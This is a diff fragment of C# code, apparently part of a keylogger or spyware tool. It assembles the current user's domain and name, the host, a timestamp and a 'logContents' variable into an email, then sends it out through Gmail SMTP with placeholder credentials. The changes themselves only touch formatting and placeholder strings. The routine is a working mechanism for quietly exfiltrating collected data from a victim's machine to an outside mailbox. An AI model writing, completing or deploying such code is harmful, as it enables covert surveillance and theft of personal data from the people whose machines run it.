@@ -78,20 +78,20 @@ namespace No_4._1
             {
                 emailBody += "Address: " + address;
 
-                emailBody += "\n User: " + Environment.UserDomainName + " \\" + Environment.UserName;
+                emailBody += "\nUser: " + Environment.UserDomainName + " \\" + Environment.UserName;
                 emailBody += "\nhost " + host;
-                emailBody += "\ntime: " + now.ToString();
+                emailBody += "\ntime: " + now.ToString() + "\n";
                 emailBody += logContents;
 
                 SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
                 MailMessage mailMessage = new MailMessage();
 
-                mailMessage.From = new MailAddress("");
-                mailMessage.To.Add("");
+                mailMessage.From = new MailAddress("/*mail*/");
+                mailMessage.To.Add("/*mail*/");
                 mailMessage.Subject = subject;
                 client.UseDefaultCredentials = false;
                 client.EnableSsl = true;
-                client.Credentials = new System.Net.NetworkCredential("", "");
+                client.Credentials = new System.Net.NetworkCredential("/*mail*/", "/*password*/");
                 mailMessage.Body = emailBody;
                 client.Send(mailMessage);
             }
